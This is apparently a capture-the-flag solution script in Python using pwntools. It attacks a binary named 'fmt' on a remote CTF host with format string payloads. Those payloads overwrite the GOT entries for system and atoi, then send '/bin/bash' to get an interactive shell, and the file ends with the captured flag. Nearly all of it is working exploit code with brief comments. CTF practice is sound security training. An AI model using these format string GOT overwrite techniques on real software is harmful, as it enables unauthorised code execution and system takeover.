#!/usr/bin/python3

"""
cmd_string 0x00402060  read-only
other_buf  0x004040a0  read-write
"""

from pwn import *

debug = False

if debug:
    context.log_level = 'debug'
    target = gdb.debug("./fmt", '''
    break * 0x004012d5
    continue
    ''')
else:
    #target = process("./fmt")
    target = remote("pwn.byteband.it", 6969)

def main():
    target.recvuntil(b": ")    
    target.sendline(b"2")

    target.recvline()

    # 2-byte write of system got.plt 0x404028 with 0x11f7
    # so now system got.plt points to main at 0x4011f7
    # system got.plt is originally 0x00401056
    #payload = b"....|%9$p.%10$p.%11$p|"
    payload = b"..|%4595u.%9$hn......|"
    payload += b"|"*2
    payload += p64(0x404028) # position 9
    payload += b"C"*8
    payload += b"D"*8
    payload += b"E"*8

    target.sendline(payload)

    target.recvuntil(b": ")
    target.sendline(b"2")

    target.recvline()

    # Now we overwrite atoi got.plt 0x00404058 with original system got.plt 0x00401056
    # 4-byte write 0x40 to 0x40405a
    # 2-byte write 0x1050 to 0x404058
    #payload2 = b"....|%9$p.%10$p.%11$p|"
    payload2 = b"|%63u%9$n%4118u%10$hn|"
    payload2 += b"|"*2
    payload2 += p64(0x40405a) # position 9
    payload2 += p64(0x404058) # position 10
    payload2 += b"C"*8
    payload2 += b"D"*8

    target.sendline(payload2)
    target.recvline()
    target.sendline(b"/bin/bash")
    target.interactive()

main()

# flag{format_string_is_t00_0ld}
